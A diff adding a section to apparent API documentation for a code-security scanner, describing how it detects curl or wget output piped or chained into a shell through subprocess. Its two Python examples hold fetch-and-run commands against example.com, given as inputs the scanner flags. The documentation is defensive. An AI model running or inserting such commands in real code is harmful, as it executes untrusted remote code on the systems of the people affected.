@@ -169,6 +169,46 @@ result = client.verify_code(code, check_security=True)
 # Issues: ["Command injection vulnerability"]
 ```
 
+### Remote code execution (pipe-to-shell)
+
+The Code Engine detects `curl` or `wget` commands piped into a shell through `subprocess`. Detection uses two layers:
+
+1. **Regex scanning** matches known attack patterns across the full source text, including multi-line invocations.
+2. **AST analysis** catches obfuscated variants that use f-strings, list arguments, or variable interpolation.
+
+The engine applies two severity tiers:
+
+- **Strict match** — `subprocess` call with `curl`/`wget` piped to `bash`/`sh` **and** `shell=True`. Message: `"Remote code execution via shell=True with curl/wget pipe to shell."`
+- **Heuristic match** — same pipe-to-shell pattern **without** `shell=True`. Message: `"Suspicious curl/wget pipe-to-shell pattern detected (heuristic)."`
+
+Both tiers are reported as `CRITICAL` severity with issue type `remote_code_execution`.
+
+```python
+code = '''
+import subprocess
+subprocess.run("curl http://example.com/install.sh | bash", shell=True)
+'''
+
+result = client.verify_code(code, check_security=True)
+# Issues: [{"type": "remote_code_execution", "severity": "CRITICAL"}]
+```
+
+In addition to pipe (`|`), the detection also matches commands chained with `;` or `&&`:
+
+```python
+code = '''
+import subprocess
+subprocess.call("wget http://example.com/payload.sh && bash payload.sh", shell=True)
+'''
+
+result = client.verify_code(code, check_security=True)
+# Issues: [{"type": "remote_code_execution", "severity": "CRITICAL"}]
+```
+
+<Note>
+This check covers `subprocess.run`, `subprocess.call`, `subprocess.Popen`, and `subprocess.check_output`. The AST-based analysis catches patterns that span multiple lines or use dynamic string construction such as f-strings.
+</Note>
+
 ---
 
 ## Complexity Analysis
